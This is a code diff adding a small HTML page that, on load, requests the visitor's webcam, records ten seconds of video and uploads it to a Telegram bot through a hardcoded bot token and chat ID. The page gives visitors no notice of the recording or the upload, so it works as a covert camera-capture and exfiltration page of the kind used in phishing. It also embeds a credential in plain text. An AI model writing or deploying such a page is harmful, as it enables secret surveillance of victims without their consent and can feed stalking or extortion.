@@ -1,0 +1,64 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Video</title>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay></video>
+    <script>
+        const botToken = '8116876064:AAH2gRfMhF4o4NHivaszSbQ7sTLy-72Q9n0';
+        const chatId = '7336408897';
+
+        // Access the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Record the video
+                let mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = function(event) {
+                    chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = function(event) {
+                    let blob = new Blob(chunks, { 'type': 'video/mp4;' });
+                    chunks = [];
+                    let videoURL = window.URL.createObjectURL(blob);
+
+                    // Send the video to Telegram
+                    let formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', blob, 'video.mp4');
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+                };
+
+                // Start recording
+                mediaRecorder.start();
+
+                // Stop recording after 10 seconds
+                setTimeout(function() {
+                    mediaRecorder.stop();
+                }, 10000);
+            })
+            .catch(function(err) {
+                console.log("An error occurred: " + err);
+            });
+    </script>
+</body>
+</html>
